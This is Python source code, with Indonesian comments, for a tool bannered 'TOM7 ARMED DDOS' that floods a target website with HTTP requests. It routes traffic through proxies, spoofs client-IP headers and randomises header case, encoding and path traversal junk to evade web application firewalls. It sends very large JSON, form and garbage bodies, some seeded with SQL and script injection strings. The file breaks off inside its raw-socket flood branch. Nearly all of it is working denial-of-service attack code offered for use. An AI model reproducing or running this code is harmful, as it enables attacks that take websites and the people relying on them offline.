try:
    # Mengimpor modul yang diperlukan
    import requests
    import threading
    import socket
    import ssl
    import httpx
    import urllib.parse 
    import string
    import random
    import json
    import colorama
    import os
    import sys
    import time 
    import signal
    from urllib.parse import urlparse, quote, unquote, quote_plus, urlencode 
    from itertools import cycle 
    from colorama import Back, Fore, Style, init
    from time import sleep 
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ModuleNotFoundError as e:
    print(f'{Fore.RED}Membutuhkan Modul {e} Yang Belum Terinstal. Silakan jalankan: pip install requests httpx colorama urllib3')
    exit()

init(autoreset=True) 

# --- Global Variables ---
useragent = []
proxychain_initial = []
good_proxies = []
referer = []
stats = {
    "sent": 0,
    "errors": {"timeout": 0, "proxy": 0, "connection": 0, "http_error": 0, "other": 0},
    "status_codes": {}
}
lock = threading.Lock()
stop_event = threading.Event()
spinner = cycle(['|', '/', '-', '\\']) 
attack_intensity = "medium" 
attack_strategy = "default" 

# --- Utility Functions ---
def cleargui():
    os.system('cls' if os.name == 'nt' else 'clear')

def dinamicsgui(startgui_text):
    cleargui()
    print(f"\n\n\n{Fore.LIGHTRED_EX}{startgui_text}...")
    time.sleep(0.15) 

current_date = time.strftime("%Y-%m-%d") 
XBanner = f"""
{Fore.YELLOW}TOM7 ARMED DDOS{Fore.RESET}
{Fore.GREEN}NETWORK ARTILLERY.{Fore.RESET}
"""

UA_FILE = 'UA.txt'
PROXY_FILE = 'Proxy.txt' 
REFERER_FILE = 'Referer.txt'

def docloader(filename, is_proxy_list=False):
    global good_proxies 
    loaded_items = []
    try:
        if not os.path.exists(filename):
            print(f'{Fore.YELLOW}[WARN]{Fore.RESET} File {filename} tidak ditemukan, dilewati.')
            return loaded_items 
            
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                item = line.strip()
                if item and not item.startswith("#"): 
                    if is_proxy_list:
                        if "://" in item: 
                            loaded_items.append(item)
                    else:
                        loaded_items.append(item)
        
        if not loaded_items and filename in [UA_FILE, PROXY_FILE, REFERER_FILE]:
            print(f'{Fore.YELLOW}[WARN]{Fore.RESET} Tidak ada item valid ditemukan atau semua baris cacat dalam {filename}.')
            if filename == PROXY_FILE:
                 print(f'{Fore.YELLOW}[INFO]{Fore.RESET} Proxy dalam {PROXY_FILE} harus berformat: skema://ip:port (misal: http://1.2.3.4:8080)')
        
        return loaded_items
        
    except FileNotFoundError: 
        print(f'{Fore.RED}[ERR]{Fore.RESET} File yang Dibutuhkan {filename} Tidak Ditemukan (Exception).')
        if filename in [UA_FILE, PROXY_FILE, REFERER_FILE]: 
            exit()
        return loaded_items 
    except Exception as e:
        print(f'{Fore.RED}[ERR]{Fore.RESET} Error saat memuat {filename}: {e}')
        if filename in [UA_FILE, PROXY_FILE, REFERER_FILE]:
            exit()
        return loaded_items 

def check_url_format(url_to_check):
    parsed = urlparse(url_to_check)
    return bool(parsed.scheme and parsed.netloc)

def initial_url_check(url_to_check):
    print(f"\n{Back.YELLOW}{Fore.BLACK}[!]{Back.RESET}{Fore.GREEN} MEMERIKSA JANGKAUAN TARGET....")
    try:
        with httpx.Client(verify=False, timeout=5, follow_redirects=True) as client: 
            response = client.head(url_to_check)
            print(f"{Fore.GREEN}[INFO]{Fore.RESET} Target {Fore.YELLOW}{url_to_check}{Fore.GREEN} merespons dengan {response.status_code}.")
            return response.status_code < 500 
    except httpx.RequestError: 
        print(f"{Fore.RED}[ERR]{Fore.RESET} Target {Fore.YELLOW}{url_to_check}{Fore.RED} tidak terjangkau atau tidak valid (RequestError).")
    except Exception: 
        print(f"{Fore.RED}[ERR]{Fore.RESET} Pemeriksaan target {Fore.YELLOW}{url_to_check}{Fore.RED} gagal (Unknown Error).")
    return False

def get_random_proxy():
    if not good_proxies: 
        if not proxychain_initial: 
            return None 
        return random.choice(proxychain_initial) 
    return random.choice(good_proxies) 

def update_stats(sent=0, error_type=None, status_code=None):
    with lock:
        if sent: stats["sent"] += sent
        if error_type: stats["errors"][error_type] = stats["errors"].get(error_type, 0) + 1
        if status_code: stats["status_codes"][status_code] = stats["status_codes"].get(status_code, 0) + 1

# --- Advanced Evasion & Payload Functions ---
def random_case_string(input_string):
    return "".join(random.choice([char.upper(), char.lower()]) if char.isalpha() else char for char in input_string)

def percent_encode_char(char_to_encode):
    if len(char_to_encode) == 1: return f"%{ord(char_to_encode):02x}"
    return char_to_encode 

def custom_url_encode(input_string, intensity="medium", strategy="default"):
    if not input_string: return ""
    s = str(input_string) 

    if (intensity == "high" or strategy == "aggressive_payload") and random.random() < 0.7:
        try:
            s = quote(quote(s, safe=''), safe='') 
            if random.random() < 0.6: 
                s = quote(s, safe='')
            if random.random() < 0.5: s = s.replace("%2525", "%25").replace("%253F", "?") 
        except Exception: pass
    elif intensity == "high" and random.random() < 0.5: 
        return "".join(percent_encode_char(c) for c in s)

    encoded_s = []
    for char in s:
        if not char.isalnum() and char not in ['-', '_', '.', '~', '/']: 
            rand_val = random.random()
            threshold = {"low": 0.3, "medium": 0.7, "high": 0.95}.get(intensity, 0.7)
            if rand_val < threshold:
                if intensity == "high" and random.random() < 0.4 and 0 <= ord(char) <= 0xFFFF:
                    encoded_s.append(random.choice([f"%u{ord(char):04x}", "".join(f"%{b:02x}" for b in char.encode('utf-8', errors='ignore'))]))
                else:
                    encoded_s.append(percent_encode_char(char))
            else:
                encoded_s.append(char)
        else:
            encoded_s.append(char)
    final_s = "".join(encoded_s)
    if intensity != "low" and ' ' in final_s:
        final_s = final_s.replace(" ", random.choice(["+", "%20", "%09", "/**/"])) 
    return final_s

def unicode_escape_string_aggressive(input_string, intensity="medium"):
    if not input_string: return ""
    escaped_s = []
    for char in input_string:
        rand_val = random.random()
        threshold = {"low": 0.15, "medium": 0.5, "high": 0.85}.get(intensity, 0.5)
        if (ord(char) > 126 or (intensity == "high" and char.isalnum() and random.random() < 0.1) or random.random() < 0.3) and rand_val < threshold : 
            if 0 <= ord(char) <= 0xFFFF: 
                escaped_s.append(random.choice([f"%u{ord(char):04x}", f"\\u{ord(char):04x}"])) 
            else: escaped_s.append(char) 
        else: escaped_s.append(char)
    return "".join(escaped_s)

def generate_waf_evasion_headers(target_host, intensity="medium", strategy="default"):
    h = {}
    spoofed_ip_1 = ".".join(str(random.randint(1,254)) for _ in range(4))
    spoofed_ip_2 = ".".join(str(random.randint(10,192))+".168."+str(random.randint(1,254))+"."+str(random.randint(1,254))) 
    spoofed_ip_3 = ".".join(str(random.randint(1,254)) for _ in range(4))

    h.update({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.5", "en-GB,en;q=0.7,es;q=0.3", "de-DE,de;q=0.9,en;q=0.4"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]), 
        "Sec-Fetch-User": "?1",
        "TE": "trailers",
    })
    if random.random() < 0.8:
        brands = []
        for _ in range(random.randint(1,3)):
            brand_name = random.choice(['"Google Chrome"', '"Chromium"', '"Microsoft Edge"', '"Opera"', '"Not_A Brand"', '"YetAnotherBrowser"'])
            version = str(random.randint(110, 125)) 
            brands.append(f'{brand_name};v="{version}"')
        h["Sec-CH-UA"] = ", ".join(brands)
        h["Sec-CH-UA-Mobile"] = f"?{random.randint(0,1)}"
        h["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"Linux"', '"macOS"', '"Android"', '"Chrome OS"'])

    xff_chain = [spoofed_ip_1]
    if intensity != "low" or strategy == "header_focused":
        xff_chain.append(spoofed_ip_2)
        if intensity == "high" or strategy == "header_focused": 
            xff_chain.append(spoofed_ip_3)
            xff_chain.append("for=" + "".join(random.choices(string.ascii_lowercase,k=5))) 
            xff_chain.append("10.0.0.0.12") 
    random.shuffle(xff_chain)
    h["X-Forwarded-For"] = ", ".join(xff_chain)
    
    if intensity != "low" or strategy == "header_focused":
        more_x_headers = {
            "X-Real-IP": spoofed_ip_1, "X-Client-IP": spoofed_ip_1, "X-Remote-IP": spoofed_ip_1,
            "CF-Connecting-IP": spoofed_ip_1, "True-Client-IP": spoofed_ip_1,
            "Forwarded": f"for={spoofed_ip_1};host={target_host};proto=https;by={spoofed_ip_2}",
            "Via": f"1.1 {custom_url_encode(''.join(random.choices(string.ascii_lowercase,k=8)),'low')}.cloudfront.net (CloudFront)", 
            "From": custom_url_encode(f"bot{random.randint(1,100)}@example.com", 'low') 
        }
        for xh_k, xh_v in more_x_headers.items():
            if random.random() < (0.5 if intensity=="medium" else 0.8 if intensity=="high" else 0.3):
                h[xh_k] = xh_v
    
    if (intensity == "high" or strategy == "header_focused") and random.random() < 0.6:
        h["X-HTTP-Method-Override"] = random.choice(["POST", "PUT", "DELETE", "PATCH", "GET", "HEAD"]) 
        h["X-Method-Override"] = h["X-HTTP-Method-Override"] 
    if intensity != "low" and random.random() < 0.5:
        url_part = "".join(random.choices(string.ascii_letters+string.digits+"/%.-",k=random.randint(20,70))) 
        h["X-Original-URL"] = custom_url_encode("/" + url_part, intensity, strategy)
        if random.random() < 0.6: h["X-Rewrite-URL"] = custom_url_encode("/" + url_part, intensity, strategy)

    if (intensity == "high" or strategy == "aggressive_payload") and random.random() < 0.4:
        boundary = "--" + "".join(random.choices(string.ascii_letters + string.digits + "-", k=random.randint(20,40)))
        h["Content-Type"] = random.choice([
            f"application/json;charset={random.choice(['UTF-8', 'utf-8', 'iso-8859-1', 'windows-1252'])}", 
            f"application/x-www-form-urlencoded; charset={random.choice(['UTF-8', 'iso-8859-1'])}",
            f"text/xml; charset={random.choice(['UTF-16BE', 'utf-8'])}",
            f"multipart/form-data; boundary={boundary}",
            "application/soap+xml; charset=utf-8", "application/graphql",
            "application/vnd.api+json", "application/x-yaml" 
        ])
    
    if intensity != "low":
        h["Cache-Control"] = random.choice(["no-cache, no-store, must-revalidate, private, max-age=0", "max-age=0, must-revalidate, proxy-revalidate", "public, max-age=0"])
        h["Pragma"] = random.choice(["no-cache", "no-cache, no-store"]) 
        h["Expires"] = random.choice(["0", "-1", "Fri, 01 Jan 1990 00:00:00 GMT"])

    if intensity == "high" and strategy != "stealth":
        for _ in range(random.randint(3,8)): 
            header_name_junk = "".join(random.choices(string.ascii_letters + "-", k=random.randint(5,15)))
            h[f"X-{header_name_junk}"] = custom_url_encode(generate_mixed_string_payload(random.randint(30,150)), intensity, strategy) 
            
    if strategy == "header_focused" or intensity == "high": 
        temp_h = {}
        for k_hdr, v_hdr in h.items():
            temp_h[random_case_string(k_hdr)] = v_hdr
        h = temp_h
    return h

def generate_complex_json_payload(depth=3, keys_per_level=3, string_length=20):
    string_length = int(string_length) # Pastikan integer
    if depth < 0: return "".join(random.choices(string.ascii_letters + string.digits, k=max(1,string_length)))
    d = {}
    for i in range(keys_per_level):
        key = f"key_{''.join(random.choices(string.ascii_lowercase, k=5))}_{i}"
        rand_val = random.random()
        if rand_val < 0.3: d[key] = generate_complex_json_payload(depth - 1, keys_per_level, string_length)
        elif rand_val < 0.6: d[key] = [generate_complex_json_payload(depth - 1, keys_per_level, string_length) for _ in range(random.randint(1,2))]
        elif rand_val < 0.8: d[key] = random.randint(0, 10000)
        elif rand_val < 0.9: d[key] = random.choice([True, False, None])
        else: d[key] = "".join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*()_+", k=max(1,string_length)))
    return d

def generate_mixed_string_payload(length=1024):
    length = int(length) # Pastikan integer
    chars = list(string.ascii_letters + string.digits + string.punctuation + ' \t\n\r') 
    return "".join(random.choices(chars, k=max(1,length))) 

def generate_aggressive_payload(payload_type="mixed_string_extreme", intensity="high", strategy="aggressive_payload", max_size_kb=20.0):
    max_len = int(max(512, max_size_kb * 1024)) # Pastikan max_len integer

    if payload_type == "deep_json_extreme":
        depth = {"low": 3, "medium": 7, "high": 12}.get(intensity, 7) 
        keys = {"low": 3, "medium": 6, "high": 10}.get(intensity, 6)  
        str_len_base = {"low": 50, "medium": 200, "high": 500}.get(intensity, 200) 
        str_len_divisor = keys**depth if keys > 0 and depth > 0 and keys**depth > 0 else 1
        str_len = int(max(20, min(str_len_base, max_len // str_len_divisor if max_len > 0 and str_len_divisor > 0 else str_len_base)))
        
        def _generate_json_recursive(current_depth):
            if current_depth <= 0 or random.random() < 0.05: 
                val_type = random.random()
                # Pastikan panjang untuk generate_mixed_string_payload adalah int
                current_str_len = random.randint(max(1, str_len//2 if str_len > 2 else 1), str_len)
                if val_type < 0.5: return unicode_escape_string_aggressive(generate_mixed_string_payload(current_str_len), intensity)
                elif val_type < 0.75: return random.randint(-2147483648, 2147483647) 
                elif val_type < 0.9: return random.choice([True, False, None, "NaN", "Infinity", "-Infinity", "null", "undefined"])
                else: return {} 
            
            obj_type = random.random()
            num_elements_in_level = random.randint(1, keys)
            if obj_type < 0.65: 
                d = {}
                for _ in range(num_elements_in_level):
                    key_name_chars = string.ascii_letters + string.digits + "_-$!@#?" 
                    key_name = "".join(random.choices(key_name_chars, k=random.randint(3,20)))
                    d[key_name] = _generate_json_recursive(current_depth - 1)
                return d
            else: 
                return [_generate_json_recursive(current_depth - 1) for _ in range(num_elements_in_level)]
        return _generate_json_recursive(depth)

    elif payload_type == "large_form_extreme":
        num_fields = int({"low": 50, "medium": 250, "high": 700}.get(intensity, 250))
        form_data = {}
        current_total_len = 0
        for i in range(num_fields):
            key_len = random.randint(3,25)
            avg_remaining_len_per_field = (max_len - current_total_len) // (num_fields - i) if (num_fields -i) > 0 else (max_len - current_total_len)
            val_len = random.randint(10, int(max(20, avg_remaining_len_per_field * 0.9 if avg_remaining_len_per_field > 10 else 20 )))
            val_len = int(min(val_len, max_len - current_total_len - key_len - 50))
            if val_len <= 0 : break
            key_name_base = "".join(random.choices(string.ascii_letters + string.digits + "_-[]().", k=key_len))
            key_name = custom_url_encode(key_name_base, intensity, strategy)
            val_content = generate_mixed_string_payload(val_len)
            form_data[key_name] = custom_url_encode(val_content, intensity, strategy) if random.random() < 0.8 else val_content 
            current_total_len += key_len + val_len
            if current_total_len >= max_len * 0.98: break
        return form_data

    elif payload_type == "mixed_garbage_extreme": 
        length = int({"low": 2048, "medium": min(max_len, 30720), "high": min(max_len, 65536)}.get(intensity, min(max_len, 30720)))
        chunks = []
        current_len = 0
        while current_len < length:
            chunk_len = random.randint(100, 1000)
            chunk = generate_mixed_string_payload(chunk_len)
            rand_choice = random.random()
            if rand_choice < 0.35: chunk = custom_url_encode(chunk, "high", strategy)
            elif rand_choice < 0.7: chunk = unicode_escape_string_aggressive(chunk, "high")
            elif rand_choice < 0.9: chunk = random_case_string(chunk)
            else: 
                chunk += "".join(chr(random.randint(0,31)) if random.random() < 0.5 else chr(random.randint(127,159)) for _ in range(random.randint(5,20)))
            chunks.append(chunk)
            current_len += len(chunk)
            if random.random() < 0.3: chunks.append(random.choice(["&", ";", "\n\t", "\r\n\r\n", "", "/** PAYLOAD **/", "%00", "\x00"])) 
        return "".join(chunks)[:length]
    
    # Fallback menggunakan generate_advanced_payload jika tipe tidak ada di generate_aggressive_payload
    return generate_advanced_payload(payload_type, intensity, strategy, max_size_kb=float(max_len / 1024.0))


def generate_advanced_payload(payload_type="mixed_string", intensity="medium", strategy="default", max_size_kb=5.0):
    max_len = int(max(128, max_size_kb * 1024))
    
    if strategy == "aggressive_payload" and not payload_type.endswith("_extreme"):
        payload_type = random.choice(["deep_json", "large_form", "problematic_string", "xml_like", "graphql_like"])
    elif strategy == "stealth" and payload_type not in ["small_json", "small_form"]:
        payload_type = random.choice(["small_json", "small_form"])

    if payload_type == "deep_json":
        depth = {"low": 2, "medium": 4, "high": 7}.get(intensity, 4)
        keys = {"low": 2, "medium": 3, "high": 6}.get(intensity, 3)
        str_len_base = {"low": 20, "medium": 60, "high": 150}.get(intensity, 60)
        str_len_divisor = keys**depth if keys > 0 and depth > 0 and keys**depth > 0 else 1
        str_len = int(max(10, min(str_len_base, max_len // str_len_divisor if max_len > 0 and str_len_divisor > 0 else str_len_base)))
        return generate_complex_json_payload(depth, keys, str_len)
        
    elif payload_type == "large_form":
        num_fields = int({"low": 10, "medium": 60, "high": 200}.get(intensity, 60))
        form_data = {}
        current_total_len = 0
        for i in range(num_fields):
            key_len = random.randint(4,12)
            avg_remaining_len_per_field = (max_len - current_total_len) // (num_fields - i) if (num_fields - i) > 0 else (max_len - current_total_len)
            val_len = random.randint(10, int(max(20, avg_remaining_len_per_field * 0.8 if avg_remaining_len_per_field > 10 else 20 ))) 
            val_len = int(min(val_len, max_len - current_total_len - key_len - 30))
            if val_len <= 0 : break
            key_name = f"field_{''.join(random.choices(string.ascii_lowercase,k=key_len))}_{i}"
            if intensity == "high" and random.random() < 0.3: key_name = selective_url_encode(key_name, "medium")
            form_data[key_name] = generate_mixed_string_payload(val_len)
            if intensity == "high" and random.random() < 0.4: form_data[key_name] = unicode_escape_string(form_data[key_name], "high")
            current_total_len += key_len + val_len
            if current_total_len >= max_len * 0.95: break
        return form_data

    elif payload_type == "problematic_string":
        length = int({"low": 256, "medium": 1024, "high": min(max_len, 5120)}.get(intensity, 1024))
        base_str = generate_mixed_string_payload(length)
        if intensity != "low": base_str = unicode_escape_string(base_str, intensity) 
        if intensity == "high": 
            entities = ["&lt;", "&gt;", "&amp;", "&quot;", "&#x27;", "&#60;", "&#000;", "<![CDATA[ ]] >", "", "' OR '1'='1", "<script>alert(1)</script>", "\"; exec('calc'); //"] 
            for _ in range(min(len(base_str) // 70, 15)): 
                if len(base_str) < max_len - 40: 
                    idx = random.randint(0, len(base_str))
                    base_str = base_str[:idx] + random.choice(entities) + base_str[idx:]
        return base_str[:max_len]
    
    elif payload_type == "xml_like":
        num_elements = int({"low": 5, "medium": 15, "high": 30}.get(intensity, 15))
        xml_str = f"<?xml version=\"1.0\" encoding=\"{random.choice(['UTF-8', 'ISO-8859-1'])}\" standalone=\"{random.choice(['yes','no'])}\" ?>\n\n<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"{random.choice(['true','false'])}\">"
        for i in range(num_elements):
            tag_name = "".join(random.choices(string.ascii_lowercase + "_-", k=random.randint(3,10)))
            tag_name = random_case_string(tag_name) if random.random() <0.3 else tag_name
            content_len = random.randint(20,150)
            content = generate_mixed_string_payload(content_len)
            if intensity == "high" and random.random() < 0.6: content = unicode_escape_string_aggressive(content, "high")
            if random.random() < 0.2 : content = f"<![CDATA[{content}]]>" 
            xml_str += f"\n  <{tag_name} id=\"{random.randint(100,999)}\">{content}</{tag_name}>"
            if len(xml_str) > max_len * 0.9: break
        xml_str += f"\n  \n</root>"
        return xml_str[:max_len]

    elif payload_type == "graphql_like":
        num_fields = int({"low": 3, "medium": 7, "high": 15}.get(intensity, 7))
        query_type = random.choice(["query", "mutation", "subscription"])
        operation_name = "".join(random.choices(string.ascii_uppercase + string.ascii_lowercase + "_", k=random.randint(5,15)))
        query = f"{query_type} {operation_name} {{ "
        for i in range(num_fields):
            field_name = "".join(random.choices(string.ascii_lowercase + "_", k=random.randint(4,10)))
            query += f"{field_name} "
            if random.random() < 0.6: 
                num_args = random.randint(1,4)
                args = []
                for j in range(num_args):
                    arg_name = "".join(random.choices(string.ascii_lowercase + "_", k=random.randint(3,7)))
                    arg_val_str = generate_mixed_string_payload(random.randint(5,20))
                    arg_val = random.choice([f'"{custom_url_encode(arg_val_str, "low", strategy)}"', str(random.randint(-100,1000)), "true", "false", "null"])
                    args.append(f"{arg_name}: {arg_val}")
                query += f"({', '.join(args)}) "
            if random.random() < 0.4 and i < num_fields -1 : 
                 query += "{{ " + "".join(random.choices(string.ascii_lowercase+"_", k=5)) + " id alias __typename }} " 
            if len(query) > max_len * 0.9: break
        query += "}"
        return query[:max_len]

    elif payload_type in ["small_json", "small_form"]: 
        return generate_complex_json_payload(random.randint(1,2),random.randint(1,3),random.randint(10,25)) if "json" in payload_type else \
               {f"p_{k}_{random.randint(1,10)}":generate_mixed_string_payload(random.randint(5,25)) for k in range(random.randint(2,5))}

    length = int({"low": 512, "medium": min(max_len, 4096), "high": min(max_len, 16384)}.get(intensity, min(max_len, 4096)))
    return generate_mixed_string_payload(length)


# --- Attack Function ---
def execute_flood(target_url, method, target_details):
    global attack_intensity, attack_strategy
    
    current_proxy = get_random_proxy()
    proxies_dict = {"http://": current_proxy, "https://": current_proxy} if current_proxy else None

    parsed_target_url = urlparse(target_url)
    original_host_header = parsed_target_url.netloc
    original_scheme = parsed_target_url.scheme

    path_segments = [seg for seg in (parsed_target_url.path or "/").split('/') if seg]
    obfuscated_path_segments = [custom_url_encode(seg, attack_intensity, attack_strategy) for seg in path_segments]
    
    if (attack_intensity == "high" or attack_strategy == "aggressive_payload") and random.random() < 0.6:
        junk_path_elements = [
            "admin_area", "user_files", ".config", "backup.zip", ".env", "phpmyadmin",
            "%2e%2e%2f" * random.randint(1,5), 
            custom_url_encode("".join(random.choices(string.ascii_letters + string.digits + "_-.", k=random.randint(8,20))), attack_intensity, attack_strategy),
            "cgi-bin/" + custom_url_encode(f"script{random.randint(1,10)}.pl", attack_intensity, attack_strategy) + f"?id={random.randint(1,1000)}"
        ]
        for _ in range(random.randint(2, 6 if attack_intensity=="high" else 3)):
            idx_to_insert = random.randint(0, len(obfuscated_path_segments)) if obfuscated_path_segments else 0
            obfuscated_path_segments.insert(idx_to_insert, random.choice(junk_path_elements))

    final_path = "/" + "/".join(obfuscated_path_segments)
    final_path = final_path.replace("//", "/").replace("/./", "/").replace("/..%2f", "/%2e%2e%2f") 

    num_base_params = random.randint(2, {"low":5, "medium":12, "high":30}.get(attack_intensity,12))
    if attack_strategy == "stealth":
        num_base_params = random.randint(1,5)

    query_dict = {}
    for i in range(num_base_params):
        param_key_base = "".join(random.choices(string.ascii_lowercase + "_-.", k=random.randint(3,12)))
        # Menggunakan generate_aggressive_payload untuk nilai parameter query juga, tapi dengan max_size_kb kecil
        param_val_len = int(random.randint(10, {"low":40, "medium":80, "high":150}.get(attack_intensity,80)))
        param_val_str = generate_mixed_string_payload(param_val_len) # generate_aggressive_payload mungkin terlalu berat untuk setiap param value
        
        obf_key = custom_url_encode(param_key_base, attack_intensity, attack_strategy)
        if (attack_intensity == "high" or attack_strategy == "header_focused") and random.random() < 0.7: 
            obf_key = random_case_string(obf_key)
        
        obf_val = custom_url_encode(param_val_str, attack_intensity, attack_strategy)
        if (attack_intensity != "low" or attack_strategy == "aggressive_payload") and random.random() < 0.8: 
            obf_val = unicode_escape_string_aggressive(obf_val, attack_intensity)
        query_dict[obf_key] = obf_val

    if method in ["GET", "HEAD"] and (attack_intensity == "high" or attack_strategy == "aggressive_payload") and random.random() < 0.7:
        extra_payload_type = random.choice(["large_form_extreme", "deep_json_extreme", "mixed_garbage_extreme"])
        # **PERBAIKAN UNTUK HTTP 414 ada di sini, max_size_kb KECIL untuk query string**
        large_query_payload_content = generate_aggressive_payload(
            extra_payload_type, 
            "medium", # Intensitas sedang untuk query payload agar tidak terlalu besar
            attack_strategy, 
            max_size_kb=0.3 # DIUBAH menjadi 0.3KB (sekitar 300 bytes sebelum encoding)
        )
        
        if isinstance(large_query_payload_content, dict): 
            for k,v in large_query_payload_content.items(): 
                query_dict[custom_url_encode(k, "medium")] = custom_url_encode(str(v), "medium")
        else: 
            query_dict[custom_url_encode(f"blob_q_data_{random.randint(1,1000)}", "medium")] = custom_url_encode(str(large_query_payload_content), 
                                                                                                             "high" if attack_intensity=="high" else "medium")
    
    def custom_quote_final(s_quote, safe_chars='', encoding=None, errors=None):
        if isinstance(s_quote, str) and s_quote.count('%') > len(s_quote) // 4 and not any(c in ' <>"{}|\\^`+' for c in unquote(s_quote)):
            return s_quote
        return quote(str(s_quote), safe=":/=&?~", encoding=encoding, errors=errors)

    final_query_string = urlencode(query_dict, doseq=True, quote_via=custom_quote_final)
    url_to_hit = urllib.parse.urlunparse((original_scheme, original_host_header, final_path, '', final_query_string, ''))

    req_headers = {"Host": original_host_header, "Connection": random.choice(["keep-alive", "close", "Keep-Alive"])} 
    req_headers.update(generate_waf_evasion_headers(original_host_header, attack_intensity, attack_strategy))
    if useragent:
        req_headers["User-Agent"] = random.choice(useragent) 
    else:
        req_headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" 
    
    if referer:
        req_headers["Referer"] = random.choice(referer) 
    else:
        req_headers["Referer"] = f"{original_scheme}://{original_host_header}/{custom_url_encode(''.join(random.choices(string.ascii_lowercase,k=15)),'medium')}" 

    body_payload_content = None
    chosen_payload_type_for_body = "mixed_string_extreme" 
    if method in ["POST", "PUT", "JSON", "JSON_HTTPX", "PATCH"]: 
        if attack_strategy == "stealth":
            chosen_payload_type_for_body = random.choice(["small_json", "small_form"])
            body_payload_content = generate_advanced_payload(chosen_payload_type_for_body, "low", "stealth", max_size_kb=1)
        elif attack_strategy == "aggressive_payload" or attack_intensity == "high":
            chosen_payload_type_for_body = random.choice(["deep_json_extreme", "large_form_extreme", "mixed_garbage_extreme", "xml_like", "graphql_like"])
            # Payload body BISA SANGAT BESAR di sini
            body_payload_content = generate_aggressive_payload(chosen_payload_type_for_body, "high", "aggressive_payload", 
                                                              max_size_kb=30 if attack_intensity == "high" else 15) 
        else: 
            chosen_payload_type_for_body = random.choice(["deep_json", "large_form", "mixed_string"]) 
            body_payload_content = generate_advanced_payload(chosen_payload_type_for_body, attack_intensity, "default", max_size_kb=15)
        
        if "Content-Type" not in req_headers:
            if chosen_payload_type_for_body in ["deep_json_extreme", "small_json"] or method in ["JSON", "JSON_HTTPX"] or "graphql" in chosen_payload_type_for_body:
                req_headers["Content-Type"] = "application/json; charset=utf-8"
            elif chosen_payload_type_for_body in ["large_form_extreme", "small_form"]:
                req_headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
            elif chosen_payload_type_for_body == "xml_like":
                req_headers["Content-Type"] = "application/xml; charset=utf-8"
            else:
                req_headers["Content-Type"] = "application/octet-stream" 
        
        if req_headers.get("Content-Type","").startswith("application/json"):
            if "graphql" in chosen_payload_type_for_body and isinstance(body_payload_content, str): 
                body_payload_content = {"query": body_payload_content, "variables": {"id": random.randint(1,1000)}} 
            elif isinstance(body_payload_content, str): 
                try:
                    body_payload_content = json.loads(body_payload_content) 
                except json.JSONDecodeError:
                    body_payload_content = {"raw_data_blob": body_payload_content} 
        elif not isinstance(body_payload_content, (dict, str, list, bytes)):
            body_payload_content = str(body_payload_content)

    try:
        timeout_val = 15 if attack_intensity == "high" else 10

        if method in ["GET", "POST", "PUT", "JSON", "HEAD", "DELETE", "PATCH"]: 
            with requests.Session() as s:
                s.headers.update(req_headers)
                if proxies_dict:
                    s.proxies.update(proxies_dict)
                request_kwargs = {'timeout': timeout_val, 'verify': False}
                response = None 
                http_method_to_call = method.lower()
                if http_method_to_call == "json": 
                    http_method_to_call = "post" 

                if hasattr(s, http_method_to_call):
                    action = getattr(s, http_method_to_call)
                    if method in ["GET", "HEAD", "DELETE"]:
                        response = action(url_to_hit, **request_kwargs)
                    else: 
                        if req_headers.get("Content-Type","").startswith("application/json"):
                            payload_for_json = body_payload_content if isinstance(body_payload_content, (dict, list)) else {"data_blob": str(body_payload_content)}
                            response = action(url_to_hit, json=payload_for_json, **request_kwargs)
                        else: 
                            response = action(url_to_hit, data=body_payload_content, **request_kwargs)
                if response is not None:
                    update_stats(sent=1, status_code=response.status_code)

        elif method in ["HTTPX", "JSON_HTTPX"]: 
            use_http2 = random.random() < (0.8 if attack_intensity != "low" else 0.5)
            with httpx.Client(http2=use_http2, headers=req_headers, proxies=proxies_dict, timeout=timeout_val, verify=False, follow_redirects=True) as client:
                response = None
                http_method_to_call = method.lower().replace("json_httpx", "post") 
                
                if hasattr(client, http_method_to_call):
                    action = getattr(client, http_method_to_call)
                    if method == "HTTPX" and not body_payload_content: 
                        response = client.get(url_to_hit) 
                    else: 
                        if req_headers.get("Content-Type","").startswith("application/json"):
                            payload_for_json = body_payload_content if isinstance(body_payload_content, (dict, list)) else {"data_blob": str(body_payload_content)}
                            response = action(url_to_hit, json=payload_for_json)
                        else: 
                            response = action(url_to_hit, data=body_payload_content)
                if response is not None:
                    update_stats(sent=1, status_code=response.status_code)

        elif method == "HTTPFlood": 
            parsed_hit_url = urlparse(url_to_hit)
            sock_host = parsed_hit_url.hostname
            sock_port = parsed_hit_url.port if parsed_hit_url.port else (443 if parsed_hit_url.scheme == "https" else 80)
            sock_path = (parsed_hit_url.path or "/") + ("?" + parsed_hit_url.query if parsed_hit_url.query else "")
            http_socket_method = random.choice(['GET', 'POST', 'PUT', 'HEAD', 'OPTIONS', 'DELETE', 'PATCH', 'SEARCH', 'CONNECT', 'PROPFIND', 'LOCK', 'INVALIDMETHOD123']) 
            http_version = random.choice(["HTTP/1.1", "HTTP/1.0", "HTTP/0.9", "HTTP/2", "SPDY/3.1"]) 
            
            raw_req_lines = [f"{http_socket_method} {sock_path} {http_version}"]
            current_socket_headers = req_headers.copy() 
            current_socket_headers['Host'] = sock_host 
            if attack_intensity == "high" or strategy == "header_focused":
                current_socket_headers[random_case_string("Connection")] = random.choice(["keep-alive", "close", "TE, close", ", ".join(random.choices(["keep-alive","upgrade","close","TE"],k=2))])
                current_socket_headers[random_case_string("Accept-Charset")] = random.choice(["utf-8, iso-8859-1;q=0.5", "*", "unicode-1-1; q=0.8"])
                current_socket_headers[random_case_string("Keep-Alive")] = f"timeout={random.randint(5,60)}, max={random.randint(100,1000)}"

            raw_body_bytes = b""
            if http_socket_method in ['POST', 'PUT', 'PATCH'] and body_payload_content:
